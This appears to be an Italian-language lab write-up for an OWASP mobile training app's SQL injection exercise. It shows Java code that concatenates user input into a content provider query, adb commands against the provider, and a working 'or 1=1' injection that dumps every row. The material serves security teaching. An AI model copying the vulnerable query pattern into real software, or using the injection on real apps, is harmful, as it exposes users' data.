## OMTG-CODING-003-SQL-INJECTION-CONTENT-PROVIDER

> app/src/main/java/sg/vp/owasp_mobile/OMTG_CODING_003_SQL_Injection_Content_Provider.java

```java
...

public void onClickAddName(View view) {
	ContentValues contentValues = new ContentValues();
	contentValues.put("name", ((EditText) findViewById(C0000R.id.editText2)).getText().toString());
	contentValues.put("grade", ((EditText) findViewById(C0000R.id.editText3)).getText().toString());

	Toast.makeText(getBaseContext(), getContentResolver().insert(OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation.CONTENT_URI, contentValues).toString(), 1).show();
}

public void onClickRetrieveStudents(View view) {
	String str;
	EditText editText = (EditText) findViewById(C0000R.id.searchPattern);
	Log.e("searchPattern", editText.getText().toString());

	if (editText.getText().toString() == null || editText.getText().toString().isEmpty()) {
		str = null;
	} else {
		str = "name='" + editText.getText().toString() + "'";
	}

	Cursor managedQuery = managedQuery(
		Uri.parse("content://sg.vp.owasp_mobile.provider.College/students"), 
		(String[]) null, 
		str, 
		(String[]) null, "name");

	if (managedQuery.moveToFirst()) {
		do {
			Toast.makeText(
				this, 
				managedQuery.getString(
					managedQuery.getColumnIndex("_id")) + ", " + 
					managedQuery.getString(managedQuery.getColumnIndex("name")) + ", " + 
					managedQuery.getString(managedQuery.getColumnIndex("grade")), 
				0)
			.show();
		} while (managedQuery.moveToNext());
	}
}

...
```

- "query all"

```sh
$ adb shell content query --uri content://sg.vp.owasp_mobile.provider.College/students

Row: 0 _id=1, name=fo, grade=7
Row: 1 _id=4, name=foo, grade=1
Row: 2 _id=5, name=foo, grade=2
Row: 3 _id=6, name=foo, grade=3
Row: 4 _id=3, name=foo-fighter, grade=5
Row: 5 _id=2, name=foo-fighters, grade=5
```

- "insert"

```sh
$ adb shell content insert --uri content://sg.vp.owasp_mobile.provider.College/students --bind name:s:"extra-student" --bind grade:s:11
```

- "query a specific name"

```sh
$ content query --uri content://sg.vp.owasp_mobile.provider.College/students --where "name='foo'"

Row: 0 _id=4, name=foo, grade=1
Row: 1 _id=5, name=foo, grade=2
Row: 2 _id=6, name=foo, grade=3
```

Exploit:

- puoi già recuperare tutti i record con il comando in "query all", ma l'obiettivo è individuare la SQL injection nella routine che gestisce il comando in "query a specific name"

```sh
$ adb shell content query --uri content://sg.vp.owasp_mobile.provider.College/students --where "name='foo' or 1=1"

Row: 0 _id=1, name=fo, grade=7
Row: 1 _id=4, name=foo, grade=1
Row: 2 _id=5, name=foo, grade=2
Row: 3 _id=6, name=foo, grade=3
Row: 4 _id=3, name=foo-fighter, grade=5
Row: 5 _id=2, name=foo-fighters, grade=5
```

N.B. il content provider è accessibile a qualsiasi applicazione in esecuzione su un device con Android 4.1 o precedenti quando nell'AndroidManifest.xml il valore di `android:exported` è impostato a `true` per il content provider.
Nelle versioni successive invece non è esposto.

Infatti, su Android 8.1.0, usando drozer si ottiene la seguente exception:

```sh
dz> run app.provider.query content://sg.vp.owasp_mobile.provider.College/students
Permission Denial: opening provider sg.vp.owasp_mobile.OMTG_Android.OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation from ProcessRecord{fe5a5d0 24973:com.mwr.dz:remote/u0a99} (pid=24973, uid=10099) that is not exported from UID 10160
dz>
```